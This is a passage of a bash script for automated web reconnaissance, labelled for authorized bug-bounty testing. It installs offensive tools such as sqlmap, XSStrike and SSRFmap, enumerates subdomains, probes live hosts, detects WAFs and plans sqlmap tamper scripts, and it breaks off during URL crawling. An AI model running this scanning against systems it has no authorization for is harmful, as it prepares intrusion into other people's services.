#!/bin/bash
# ============================================================
#  recon_linux.sh — Full Recon & Vuln Scanner (Linux)
#  Uses: subfinder, amass, assetfinder, httpx, katana,
#        gospider, hakrawler, waybackurls, gau, subjs,
#        LinkFinder, nuclei, dalfox, gf, ffuf, nmap,
#        naabu, dnsx, anew, uro, qsreplace, sqlmap, nikto
#
#  For AUTHORIZED security testing / bug bounty only.
#  Usage: bash recon_linux.sh -d example.com [options]
# ============================================================

set -uo pipefail

# ── Colours ────────────────────────────────────────────────
RED='\033[0;31m';   GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m';  CYAN='\033[0;36m';  WHITE='\033[1;37m'
BOLD='\033[1m';     NC='\033[0m'

banner() {
cat << 'EOF'

 ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
 ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝
 ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗
 ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝

          Full Recon & Vulnerability Scanner — Linux Edition
          For AUTHORIZED security testing / bug bounty only!    By -- VTRAP
EOF
}

# ── Logging helpers ────────────────────────────────────────
info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[✗]${NC} $*"; }
phase()   { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════${NC}"; \
            echo -e "${BOLD}${BLUE}  $*${NC}"; \
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════${NC}"; }
found()   { echo -e "${GREEN}[FOUND]${NC} $*"; }
verbose() { $VERBOSE && echo -e "${BLUE}[V]${NC} $*" || true; }

# ── Defaults ────────────────────────────────────────────────
THREADS=50
TIMEOUT=10
WORDLIST="/usr/share/wordlists/dirb/common.txt"
RESOLVERS="/tmp/resolvers.txt"
INSTALL_MISSING=false
SKIP_HEAVY=false       # skip nmap, amass, sqlmap (slow)
SKIP_FUZZ=false
SKIP_JS=false          # skip JS file discovery & endpoint mining (phase 4)
VERBOSE=false          # show raw tool output and per-URL probe progress
OUT_DIR="./recon_results"
DOMAIN=""
LINKFINDER_DIR="$HOME/tools/LinkFinder"
LINKFINDER_PYTHON="python3"

# ── Feature defaults (improvement additions) ────────────────
AUTH_COOKIE=""           # -c "name=value"
AUTH_HEADER=""           # -H "Header: Value"
DELAY_MS=0               # --delay N ms between requests
RATE_LIMIT=0             # --rate N req/s (0=unlimited)
EXCLUDE_FILE=""          # --exclude FILE
INCLUDE_FILE=""          # --include-only FILE
RESUME=false             # --resume: skip phases with existing output
DRY_RUN=false            # --dry-run: print actions, don't execute
SLACK_URL=""             # --notify-slack URL
DISCORD_URL=""           # --notify-discord URL
TARGETS_FILE=""          # -l FILE: multi-target list
CONFIG_FILE="$HOME/.recon.conf"
WAF_DETECTED=""          # filled by phase2
TARGET_IP=""             # -i IP/CIDR: IP scan mode target
IP_MODE=false            # enabled when -i is used

# ── Load config file early (CLI args override it) ───────────
[[ -f "$HOME/.recon.conf" ]] && source "$HOME/.recon.conf" 2>/dev/null || true

# ── Argument parsing ────────────────────────────────────────
usage() {
  echo -e "\n${BOLD}Usage:${NC} bash recon_linux.sh -d <domain> [options]\n"
  echo "  -d  domain            Target domain (required unless -l or -i used)"
  echo "  -l  targets.txt       Multi-target: one domain per line"
  echo "  -i  IP/CIDR           IP scan mode: single IP or CIDR range (e.g. 10.0.0.1 or 10.0.0.0/24)"
  echo "                        Skips subdomain enum; runs port scan, HTTP probe, and vuln scan"
  echo "  -o  dir               Output directory (default: ./recon_results/<domain>)"
  echo "  -t  threads           Thread count (default: 50)"
  echo "  -w  wordlist          Wordlist for ffuf/gobuster"
  echo "  -c  'name=value'      Auth cookie string (passed to curl/tools)"
  echo "  -H  'Header: Value'   Extra auth header (e.g. 'Authorization: Bearer TOKEN')"
  echo "  --config FILE         Config file (default: ~/.recon.conf)"
  echo "  --install             Auto-install missing Go tools"
  echo "  --skip-heavy          Skip slow tools: nmap, amass, sqlmap"
  echo "  --skip-fuzz           Skip directory fuzzing (ffuf)"
  echo "  --skip-js             Skip JS file discovery & endpoint mining (phase 4)"
  echo "  --delay N             Milliseconds to sleep between requests"
  echo "  --rate N              Max requests per second (0=unlimited)"
  echo "  --exclude FILE        File with domains/IPs to exclude from scope"
  echo "  --include-only FILE   File with domains/IPs to restrict scope to"
  echo "  --resume              Skip phases whose output files already exist"
  echo "  --dry-run             Print what would run without executing"
  echo "  --notify-slack URL    POST completion summary to Slack webhook"
  echo "  --notify-discord URL  POST completion summary to Discord webhook"
  echo "  -v, --verbose         Show raw tool output and per-URL probe details"
  echo "  -h                    Show this help"
  echo ""
  echo "Env vars: SSRF_CALLBACK, BXSS_CALLBACK"
  echo ""
  echo "Examples:"
  echo "  bash recon_linux.sh -d example.com --install"
  echo "  bash recon_linux.sh -l targets.txt --resume --delay 200"
  echo "  bash recon_linux.sh -d example.com -c 'session=abc' -H 'X-Token: xyz'"
  exit 0
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -d)  DOMAIN="$2";          shift 2 ;;
    -l)  TARGETS_FILE="$2";    shift 2 ;;
    -i)  TARGET_IP="$2"; IP_MODE=true; shift 2 ;;
    -o)  OUT_DIR="$2";         shift 2 ;;
    -t)  THREADS="$2";         shift 2 ;;
    -w)  WORDLIST="$2";        shift 2 ;;
    -c)  AUTH_COOKIE="$2";     shift 2 ;;
    -H)  AUTH_HEADER="$2";     shift 2 ;;
    --config)       CONFIG_FILE="$2"; shift 2
                    [[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE" 2>/dev/null || true ;;
    --install)      INSTALL_MISSING=true; shift ;;
    --skip-heavy)   SKIP_HEAVY=true;      shift ;;
    --skip-fuzz)    SKIP_FUZZ=true;       shift ;;
    --skip-js)      SKIP_JS=true;         shift ;;
    --delay)        DELAY_MS="$2";        shift 2 ;;
    --rate)         RATE_LIMIT="$2";      shift 2 ;;
    --exclude)      EXCLUDE_FILE="$2";    shift 2 ;;
    --include-only) INCLUDE_FILE="$2";    shift 2 ;;
    --resume)       RESUME=true;          shift ;;
    --dry-run)      DRY_RUN=true;         shift ;;
    --notify-slack)   SLACK_URL="$2";     shift 2 ;;
    --notify-discord) DISCORD_URL="$2";   shift 2 ;;
    -v|--verbose)   VERBOSE=true;         shift ;;
    -h|--help)      usage ;;
    *)   error "Unknown option: $1"; usage ;;
  esac
done

[[ -z "$DOMAIN" && -z "$TARGETS_FILE" && "$IP_MODE" == false ]] && { error "Provide -d domain, -l targets.txt, or -i IP/CIDR"; usage; }

# ── Compute verbose-aware globals ───────────────────────────
# REDIR  : stderr sink  — /dev/null normally, /dev/stderr in verbose
# SILENT : -silent flag — passed to tools that support it
# QFLAG  : -q / quiet flag for pip/apt
if $VERBOSE; then
  REDIR="/dev/stderr"
  SILENT=""
  QFLAG=""
else
  REDIR="/dev/null"
  SILENT="-silent"
  QFLAG="-q"
fi

# OUT is set per-domain inside scan_single() — placeholder here for tool checks
OUT="${OUT_DIR}/${DOMAIN:-_placeholder}"

# ── Tool checker / installer ────────────────────────────────
GO_TOOLS=(
  "subfinder:github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
  "httpx:github.com/projectdiscovery/httpx/cmd/httpx@latest"
  "nuclei:github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
  "katana:github.com/projectdiscovery/katana/cmd/katana@latest"
  "naabu:github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
  "dnsx:github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
  "waybackurls:github.com/tomnomnom/waybackurls@latest"
  "assetfinder:github.com/tomnomnom/assetfinder@latest"
  "httprobe:github.com/tomnomnom/httprobe@latest"
  "anew:github.com/tomnomnom/anew@latest"
  "gf:github.com/tomnomnom/gf@latest"
  "qsreplace:github.com/tomnomnom/qsreplace@latest"
  "hakrawler:github.com/hakluke/hakrawler@latest"
  "gau:github.com/lc/gau/v2/cmd/gau@latest"
  "dalfox:github.com/hahwul/dalfox/v2@latest"
  "gospider:github.com/jaeles-project/gospider@latest"
  "ffuf:github.com/ffuf/ffuf/v2@latest"
  "subjs:github.com/lc/subjs@latest"
  "kxss:github.com/Emoe/kxss@latest"
  "Gxss:github.com/KathanP19/Gxss@latest"
  "bxss:github.com/ethicalhackingplayground/bxss@latest"
  "interactsh-client:github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
  "crlfuzz:github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest"
  "byp4xx:github.com/lobuhi/byp4xx@latest"
  "trufflehog:github.com/trufflesecurity/trufflehog/v3@latest"
  "alterx:github.com/projectdiscovery/alterx/cmd/alterx@latest"
  "shuffledns:github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
  "tlsx:github.com/projectdiscovery/tlsx/cmd/tlsx@latest"
  "uncover:github.com/projectdiscovery/uncover/cmd/uncover@latest"
  "cdncheck:github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest"
  "cariddi:github.com/edoardottt/cariddi/cmd/cariddi@latest"
  "mapcidr:github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest"
)

APT_TOOLS=(nmap nikto whatweb amass dnsutils curl wget python3 python3-pip git)

# ── Auto-locate a binary in common install dirs and add its dir to PATH ──
find_tool() {
  local tool="$1"
  local dir
  local search_dirs=(
    "$HOME/go/bin"
    "$HOME/.local/bin"
    "$HOME/tools"
    "$HOME/tools/bin"
    "/usr/local/bin"
    "/snap/bin"
    "/opt/homebrew/bin"
  )
  if command -v go &>/dev/null; then
    local gobin
    gobin="$(go env GOPATH 2>/dev/null)/bin"
    [[ -n "$gobin" && "$gobin" != "/bin" ]] && search_dirs+=("$gobin")
  fi
  for dir in "${search_dirs[@]}"; do
    if [[ -x "$dir/$tool" ]]; then
      if [[ ":$PATH:" != *":$dir:"* ]]; then
        export PATH="$PATH:$dir"
        info "Found $tool at $dir — added to PATH"
      fi
      return 0
    fi
  done
  return 1
}

# ── Install a Python CLI tool safely, bypassing PEP 668 restrictions ─────
install_python_tool() {
  local package="$1"
  local tool="${2:-$1}"

  # Prefer pipx — manages isolated venvs automatically
  if ! command -v pipx &>/dev/null; then
    sudo apt-get install -y -qq pipx 2>/dev/null || true
    export PATH="$PATH:$HOME/.local/bin"
  fi
  if command -v pipx &>/dev/null; then
    if pipx install "$package" -q 2>/dev/null; then
      export PATH="$PATH:$HOME/.local/bin"
      success "$tool installed via pipx"
      return 0
    fi
  fi

  # Fallback: dedicated venv + symlink into ~/.local/bin
  local venv_dir="$HOME/.venvs/$tool"
  info "Using venv for $tool …"
  if python3 -m venv "$venv_dir" 2>/dev/null \
     && "$venv_dir/bin/pip" install -q "$package"; then
    mkdir -p "$HOME/.local/bin"
    ln -sf "$venv_dir/bin/$tool" "$HOME/.local/bin/$tool" 2>/dev/null || true
    export PATH="$PATH:$HOME/.local/bin"
    success "$tool installed via venv"
    return 0
  fi

  warn "Could not install $tool"
  return 1
}

# ── Clone a GitHub Python tool into ~/tools/<name> with its own venv ──
install_git_tool() {
  local name="$1"   # display name / dir basename
  local url="$2"    # git clone URL
  local dir="$HOME/tools/$name"

  if [[ -d "$dir" ]]; then
    # Already cloned — ensure venv exists
    if [[ ! -x "$dir/venv/bin/python" ]]; then
      python3 -m venv "$dir/venv" 2>/dev/null \
        && [[ -f "$dir/requirements.txt" ]] \
        && "$dir/venv/bin/pip" install $QFLAG -r "$dir/requirements.txt" 2>"$REDIR" || true
    fi
    success "$name ✓"
    return 0
  fi

  if $INSTALL_MISSING; then
    info "Cloning $name …"
    git clone $QFLAG "$url" "$dir" 2>"$REDIR" || { warn "Failed to clone $name"; return 1; }
    python3 -m venv "$dir/venv" 2>/dev/null || true
    [[ -f "$dir/requirements.txt" ]] \
      && "$dir/venv/bin/pip" install $QFLAG -r "$dir/requirements.txt" 2>"$REDIR" || true
    success "$name installed → $dir"
  else
    warn "$name not found — run with --install"
  fi
}

# ── Rate limiting helper ────────────────────────────────────
rate_wait() {
  if [[ $DELAY_MS -gt 0 ]]; then
    sleep "$(echo "scale=3; $DELAY_MS/1000" | bc)"
  fi
}

# ── Dry-run guard: wrap commands ────────────────────────────
# Usage: drun cmd arg1 arg2 ...  → skips if --dry-run
drun() {
  if $DRY_RUN; then
    echo -e "${YELLOW}[DRY-RUN]${NC} $*"
    return 0
  fi
  "$@"
}

# ── Send notification (Slack + Discord) ─────────────────────
notify() {
  local msg="$1"
  if [[ -n "$SLACK_URL" ]]; then
    curl -sk -X POST -H 'Content-type: application/json' \
      --data "{\"text\":\"$msg\"}" "$SLACK_URL" >/dev/null 2>&1 || true
  fi
  if [[ -n "$DISCORD_URL" ]]; then
    curl -sk -X POST -H 'Content-type: application/json' \
      --data "{\"content\":\"$msg\"}" "$DISCORD_URL" >/dev/null 2>&1 || true
  fi
}

# ── Progress counter ─────────────────────────────────────────
# Usage: progress N TOTAL label
progress() {
  local n="$1" total="$2" label="$3"
  echo -ne "${CYAN}  [${n}/${total}]${NC} ${label}\r"
}

# ── Scope filter: remove excluded, keep only included ────────
apply_scope() {
  local input="$1"   # file to filter in-place
  [[ ! -f "$input" ]] && return 0
  local tmp
  tmp=$(mktemp)
  cp "$input" "$tmp"

  # Remove excluded entries
  if [[ -n "$EXCLUDE_FILE" && -f "$EXCLUDE_FILE" ]]; then
    grep -vFf "$EXCLUDE_FILE" "$tmp" > "${tmp}.2" 2>/dev/null && mv "${tmp}.2" "$tmp" || true
  fi

  # Keep only included entries
  if [[ -n "$INCLUDE_FILE" && -f "$INCLUDE_FILE" ]]; then
    grep -Ff "$INCLUDE_FILE" "$tmp" > "${tmp}.2" 2>/dev/null && mv "${tmp}.2" "$tmp" || true
  fi

  cp "$tmp" "$input"
  rm -f "$tmp" "${tmp}.2"
}

# ── Resume check: return 0 (skip) if file exists and non-empty ─
phase_done() {
  local marker="$1"
  if $RESUME && [[ -f "$marker" ]] && [[ -s "$marker" ]]; then
    info "Resuming — skipping (output exists): $marker"
    return 0
  fi
  return 1
}

# ── Auth curl args ────────────────────────────────────────────
# Returns extra curl flags for auth (cookie + header)
curl_auth() {
  local args=()
  [[ -n "$AUTH_COOKIE" ]] && args+=(-b "$AUTH_COOKIE")
  [[ -n "$AUTH_HEADER" ]] && args+=(-H "$AUTH_HEADER")
  echo "${args[@]}"
}

# ── Baseline request: capture unmodified response length ──────
baseline_req() {
  local url="$1"
  # shellcheck disable=SC2046
  curl -sk --max-time "$TIMEOUT" $(curl_auth) -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo 0
}

check_and_install_tools() {
  phase "Tool Check & Installation"

  # Check Go
  if ! command -v go &>/dev/null; then
    warn "Go not found. Go tools won't be installed automatically."
    warn "Install Go: https://go.dev/dl/"
    HAS_GO=false
  else
    HAS_GO=true
    success "Go $(go version | awk '{print $3}') found"
    export GOPATH="$HOME/go"
    export PATH="$PATH:$GOPATH/bin"
  fi

  # APT tools
  missing_apt=()
  for tool in "${APT_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      missing_apt+=("$tool")
    fi
  done

  if [[ ${#missing_apt[@]} -gt 0 ]]; then
    if $INSTALL_MISSING; then
      info "Installing apt tools: ${missing_apt[*]}"
      sudo apt-get update $QFLAG 2>"$REDIR"
      sudo apt-get install -y $QFLAG "${missing_apt[@]}" 2>"$REDIR"
    else
      warn "Missing apt tools: ${missing_apt[*]}"
      warn "Run with --install to auto-install, or: sudo apt install ${missing_apt[*]}"
    fi
  fi

  # Go tools
  echo ""
  missing_go=()
  for entry in "${GO_TOOLS[@]}"; do
    tool="${entry%%:*}"
    pkg="${entry##*:}"
    if command -v "$tool" &>/dev/null; then
      success "$tool ✓"
    elif find_tool "$tool"; then
      success "$tool ✓"
    else
      missing_go+=("$tool")
      warn "$tool ✗ (not found)"
      if $HAS_GO; then
        if $INSTALL_MISSING; then
          info "Installing $tool …"
          verbose "CMD: go install $pkg"
          if go install "$pkg" 2>"$REDIR"; then
            find_tool "$tool" || true
            success "$tool installed"
          else
            warn "Failed to install $tool"
          fi
        else
          warn "Run with --install to auto-install, or: go install $pkg"
        fi
      else
        warn "Go not found — cannot auto-install $tool"
      fi
    fi
  done

  # uro (Python)
  if ! command -v uro &>/dev/null && ! find_tool "uro"; then
    warn "uro not found"
    if $INSTALL_MISSING; then
      install_python_tool "uro"
    else
      warn "Run with --install to auto-install uro"
    fi
  else
    success "uro ✓"
  fi

  # LinkFinder (Python) — uses a dedicated venv to avoid PEP 668
  if [[ ! -f "$LINKFINDER_DIR/linkfinder.py" ]]; then
    warn "LinkFinder not found at $LINKFINDER_DIR"
    if $INSTALL_MISSING; then
      mkdir -p "$HOME/tools"
      git clone -q https://github.com/GerbenJavado/LinkFinder.git "$LINKFINDER_DIR"
      python3 -m venv "$LINKFINDER_DIR/venv" \
        && "$LINKFINDER_DIR/venv/bin/pip" install -q -r "$LINKFINDER_DIR/requirements.txt" \
        && success "LinkFinder installed" \
        || warn "LinkFinder dependency install failed"
    fi
  fi
  if [[ -f "$LINKFINDER_DIR/linkfinder.py" ]]; then
    if [[ ! -x "$LINKFINDER_DIR/venv/bin/python" ]]; then
      info "Setting up LinkFinder venv …"
      python3 -m venv "$LINKFINDER_DIR/venv" \
        && "$LINKFINDER_DIR/venv/bin/pip" install -q -r "$LINKFINDER_DIR/requirements.txt" \
        2>/dev/null || true
    fi
    if [[ -x "$LINKFINDER_DIR/venv/bin/python" ]]; then
      LINKFINDER_PYTHON="$LINKFINDER_DIR/venv/bin/python"
    fi
    success "LinkFinder ✓ (python: $LINKFINDER_PYTHON)"
  fi

  # nuclei templates
  if command -v nuclei &>/dev/null; then
    info "Updating nuclei templates …"
    nuclei -update-templates -silent 2>/dev/null || true
  fi

  # Setup gf patterns
  if command -v gf &>/dev/null; then
    GF_PATTERNS_DIR="$HOME/.gf"
    if [[ ! -d "$GF_PATTERNS_DIR" ]]; then
      mkdir -p "$GF_PATTERNS_DIR"
      if [[ -d "$HOME/tools/Gf-Patterns" ]]; then
        cp "$HOME/tools/Gf-Patterns"/*.json "$GF_PATTERNS_DIR/" 2>/dev/null || true
      else
        $INSTALL_MISSING && git clone -q https://github.com/1ndianl33t/Gf-Patterns \
          "$HOME/tools/Gf-Patterns" && \
          cp "$HOME/tools/Gf-Patterns"/*.json "$GF_PATTERNS_DIR/" 2>/dev/null || true
      fi
    fi
  fi

  # ── Python tools via pipx (PyPI packages) ────────────────────────
  echo ""
  info "Checking Python security tools …"
  local PIPX_TOOLS=(
    "arjun:arjun"               # parameter discovery (s0md3v/Arjun)
    "ghauri:ghauri"             # advanced SQLi scanner
    "xsrfprobe:xsrfprobe"       # CSRF auditing toolkit
    "paramspider:paramspider"   # parameter mining from Wayback
    "wfuzz:wfuzz"               # web fuzzer
  )
  for entry in "${PIPX_TOOLS[@]}"; do
    pkg="${entry%%:*}"
    tool="${entry##*:}"
    if command -v "$tool" &>/dev/null || find_tool "$tool"; then
      success "$tool ✓"
    else
      warn "$tool ✗ (not found)"
      $INSTALL_MISSING && install_python_tool "$pkg" "$tool" || true
    fi
  done

  # ── GitHub-only Python tools (git clone + venv) ───────────────────
  echo ""
  info "Checking git-clone security tools …"
  local GIT_TOOLS=(
    "XSStrike:https://github.com/s0md3v/XSStrike.git"
    "SSRFmap:https://github.com/swisskyrepo/SSRFmap.git"
    "jwt_tool:https://github.com/ticarpi/jwt_tool.git"
    "smuggler:https://github.com/defparam/smuggler.git"
    "Corsy:https://github.com/s0md3v/Corsy.git"
    "SQLiScanner:https://github.com/the-robot/sqliv.git"
    "CORScanner:https://github.com/chenjj/CORScanner.git"
  )
  for entry in "${GIT_TOOLS[@]}"; do
    name="${entry%%:*}"
    url="${entry##*:}"
    install_git_tool "$name" "$url"
  done

  echo ""
  info "Tool check done. Missing tools will be skipped gracefully."
}

# ── Helper: run a command only if tool exists ───────────────
run_if() {
  local tool="$1"; shift
  if command -v "$tool" &>/dev/null; then
    "$tool" "$@"
  else
    warn "$tool not found — skipping"
    return 0
  fi
}

# ── Run a command, printing it first when verbose ────────────
vrun() {
  verbose "CMD: $*"
  if $VERBOSE; then
    "$@"
  else
    "$@" 2>/dev/null
  fi
}

count_lines() { [[ -f "$1" ]] && wc -l < "$1" || echo 0; }

# ── Default resolver list ───────────────────────────────────
make_resolvers() {
  cat > "$RESOLVERS" << 'EOF'
8.8.8.8
8.8.4.4
1.1.1.1
1.0.0.1
9.9.9.9
208.67.222.222
208.67.220.220
EOF
}

# ═══════════════════════════════════════════════════════════
#  PHASE 1 — Subdomain Enumeration
# ═══════════════════════════════════════════════════════════
phase1_subdomains() {
  phase "PHASE 1 — Subdomain Enumeration"
  local sub_dir="$OUT/subdomains"
  local all="$sub_dir/all_subdomains.txt"

  phase_done "$all" && return 0

  # 1a–1d: run passive sources in parallel
  info "Running passive subdomain sources in parallel …"

  # subfinder
  ( if command -v subfinder &>/dev/null; then
      local sf_cfg=""
      [[ -f "$HOME/.config/subfinder/provider-config.yaml" ]] && sf_cfg="-config $HOME/.config/subfinder/provider-config.yaml"
      subfinder -d "$DOMAIN" $SILENT -all $sf_cfg -o "$sub_dir/subfinder.txt" 2>"$REDIR" || true
      success "subfinder: $(count_lines "$sub_dir/subfinder.txt") subdomains"
    fi ) &
  PID_SF=$!

  # assetfinder
  ( if command -v assetfinder &>/dev/null; then
      assetfinder --subs-only "$DOMAIN" 2>"$REDIR" \
        | grep "\.$DOMAIN$" > "$sub_dir/assetfinder.txt" || true
      success "assetfinder: $(count_lines "$sub_dir/assetfinder.txt") subdomains"
    fi ) &
  PID_AF=$!

  # crt.sh
  ( curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null \
      | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  [print(n.strip().lstrip('*.')) for e in data for n in e.get('name_value','').split('\n') if '$DOMAIN' in n]
except: pass
" | sort -u > "$sub_dir/crtsh.txt" 2>/dev/null || true
    success "crt.sh: $(count_lines "$sub_dir/crtsh.txt") subdomains" ) &
  PID_CRT=$!

  # amass (only if not --skip-heavy)
  PID_AMASS=""
  if ! $SKIP_HEAVY && command -v amass &>/dev/null; then
    ( amass enum -passive -d "$DOMAIN" -o "$sub_dir/amass.txt" 2>"$REDIR" || true
      success "amass: $(count_lines "$sub_dir/amass.txt") subdomains" ) &
    PID_AMASS=$!
  fi

  wait $PID_SF $PID_AF $PID_CRT 2>/dev/null || true
  [[ -n "$PID_AMASS" ]] && wait $PID_AMASS 2>/dev/null || true

  # 1e. DNS brute force with dnsx
  if command -v dnsx &>/dev/null; then
    info "DNS brute-force with dnsx …"
    python3 -c "
subs=['www','api','dev','test','staging','prod','admin','mail','ftp','vpn','app','portal',
      'beta','demo','docs','cdn','static','assets','media','login','auth','sso','git',
      'gitlab','jenkins','jira','wiki','support','help','dashboard','console','backend',
      'mobile','shop','store','pay','billing','account','accounts','internal','intranet',
      'monitor','status','grafana','kibana','elastic','redis','db','mysql','mongodb',
      's3','api2','v1','v2','graphql','sandbox','uat','qa','legacy','old','new',
      'forum','community','blog','news','search','panel','manage','upload','files',
      'download','report','reports','analytics','track','logs','audit','backup']
import sys
domain=sys.argv[1]
for s in subs: print(f'{s}.{domain}')
" "$DOMAIN" | dnsx -silent -r "$RESOLVERS" -o "$sub_dir/dnsx_brute.txt" 2>/dev/null \
    && success "dnsx brute: $(count_lines "$sub_dir/dnsx_brute.txt") subdomains"
  fi

  # Merge + deduplicate
  cat "$sub_dir"/*.txt 2>/dev/null \
    | grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" \
    | grep "$DOMAIN$" \
    | sort -u > "$all"

  # Apply scope filters
  apply_scope "$all"

  success "Total unique subdomains: $(count_lines "$all")"
}

# ═══════════════════════════════════════════════════════════
#  PHASE 2 — DNS Resolution & Live Check
# ═══════════════════════════════════════════════════════════
phase2_live() {
  phase "PHASE 2 — DNS Resolution & Live Host Detection"
  local all="$OUT/subdomains/all_subdomains.txt"
  local resolved="$OUT/subdomains/resolved.txt"
  local live_domains="$OUT/live_domains.txt"
  local dead_domains="$OUT/dead_domains.txt"
  local live_urls="$OUT/live_urls.txt"

  # DNS resolution check
  if command -v dnsx &>/dev/null; then
    info "Resolving subdomains via dnsx …"
    dnsx -l "$all" $SILENT -r "$RESOLVERS" -o "$resolved" 2>"$REDIR" \
      && success "Resolved: $(count_lines "$resolved") hosts"
  else
    cp "$all" "$resolved"
  fi

  # HTTP liveness probe with httpx
  info "Probing live hosts with httpx …"
  if command -v httpx &>/dev/null; then
    httpx -l "$resolved" $SILENT \
      -status-code -title -tech-detect -content-length \
      -threads "$THREADS" \
      -o "$OUT/httpx_full.txt" 2>"$REDIR"

    # Separate live vs dead
    awk '{print $1}' "$OUT/httpx_full.txt" 2>/dev/null \
      | sed 's|https\?://||' | sort -u > "$live_domains"

    comm -23 \
      <(sort "$resolved") \
      <(sort "$live_domains") > "$dead_domains" 2>/dev/null || true

    # Full URLs (http + https)
    awk '{print $1}' "$OUT/httpx_full.txt" 2>/dev/null \
      | sort -u > "$live_urls"

    success "Live domains  → $live_domains ($(count_lines "$live_domains"))"
    success "Dead domains  → $dead_domains ($(count_lines "$dead_domains"))"
    success "Live URLs     → $live_urls"
  else
    # Fallback: httprobe
    info "httpx not found, using httprobe …"
    cat "$resolved" | run_if httprobe \
      | sort -u > "$live_urls"
    sed 's|https\?://||' "$live_urls" | sort -u > "$live_domains"
    success "Live URLs: $(count_lines "$live_urls")"
  fi

  # Print technology findings + save tech list for phase 8
  if [[ -f "$OUT/httpx_full.txt" ]]; then
    info "Technology fingerprints (top 20):"
    grep -oP '\[.*?\]' "$OUT/httpx_full.txt" 2>/dev/null \
      | sort | uniq -c | sort -rn | head -20 || true
    # Save detected tech for tech-specific scanning
    grep -oP '\[.*?\]' "$OUT/httpx_full.txt" 2>/dev/null \
      | tr -d '[]' | tr ',' '\n' | sort -u > "$OUT/detected_tech.txt" 2>/dev/null || true
  fi

  # WAF detection
  info "Running WAF detection …"
  if command -v wafw00f &>/dev/null && [[ -f "$live_urls" ]]; then
    local waf_out="$OUT/waf_detection.txt"
    head -5 "$live_urls" | while IFS= read -r url; do
      wafw00f "$url" 2>/dev/null | grep -E "(is behind|No WAF)" | tee -a "$waf_out" || true
    done
    if grep -qi "is behind" "$waf_out" 2>/dev/null; then
      WAF_DETECTED=$(grep -oi 'is behind [a-zA-Z0-9 ]+' "$waf_out" 2>/dev/null | head -1 | sed 's/is behind //')
      warn "WAF detected: $WAF_DETECTED — will add tamper scripts to sqlmap"
    else
      success "No WAF detected"
    fi
  else
    # Lightweight WAF heuristic via curl
    local waf_url
    waf_url=$(head -1 "$live_urls" 2>/dev/null || echo "https://$DOMAIN")
    local waf_headers
    waf_headers=$(curl -sk --max-time "$TIMEOUT" -I "$waf_url" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    if echo "$waf_headers" | grep -qiE "x-sucuri|cloudflare|x-firewall|akamai|imperva|f5-bigip|mod_security"; then
      WAF_DETECTED=$(echo "$waf_headers" | grep -oiE "cloudflare|sucuri|akamai|imperva|f5-bigip" | head -1)
      warn "WAF heuristic match: $WAF_DETECTED"
    fi
  fi
  [[ -n "$WAF_DETECTED" ]] && echo "$WAF_DETECTED" > "$OUT/waf.txt"
}

# ═══════════════════════════════════════════════════════════
#  PHASE 3 — URL & Endpoint Discovery
# ═══════════════════════════════════════════════════════════
phase3_urls() {
  phase "PHASE 3 — URL & Endpoint Discovery"
  local live_urls="$OUT/live_urls.txt"
  local url_dir="$OUT/urls"
  local all_urls="$url_dir/all_urls.txt"

  phase_done "$all_urls" && return 0

  info "Running URL discovery sources in parallel …"

  # 3a. Wayback + 3b. gau in parallel (passive)
  ( run_if waybackurls "$DOMAIN" 2>/dev/null \
      | sort -u > "$url_dir/wayback.txt"
    success "waybackurls: $(count_lines "$url_dir/wayback.txt") URLs" ) &
  PID_WB=$!

  ( run_if gau "$DOMAIN" --subs --threads "$THREADS" 2>/dev/null \
      | sort -u > "$url_dir/gau.txt"
    success "gau: $(count_lines "$url_dir/gau.txt") URLs" ) &
  PID_GAU=$!

  # 3c. katana (active)
  PID_KT=""
  if command -v katana &>/dev/null && [[ -f "$live_urls" ]]; then
    ( katana -list "$live_urls" -silent \
        -depth 3 -js-crawl -known-files all \
        -concurrency "$THREADS" -timeout "$TIMEOUT" \
        -o "$url_dir/katana.txt" 2>/dev/null || true
      success "katana: $(count_lines "$url_dir/katana.txt") URLs" ) &
    PID_KT=$!
  fi

  # 3d. gospider
  PID_GS=""
  if command -v gospider &>/dev/null && [[ -f "$live_urls" ]]; then
    ( gospider -S "$live_urls" -d 3 -c "$THREADS" --sitemap --robots \
        -o "$url_dir/gospider_raw" 2>/dev/null || true
      cat "$url_dir/gospider_raw"/* 2>/dev/null \
        | grep -oP 'https?://[^\s"]+' | sort -u > "$url_dir/gospider.txt"
      success "gospider: $(count_lines "$url_dir/gospider.txt") URLs" ) &
    PID_GS=$!
  fi

  # 3e. hakrawler
  PID_HK=""
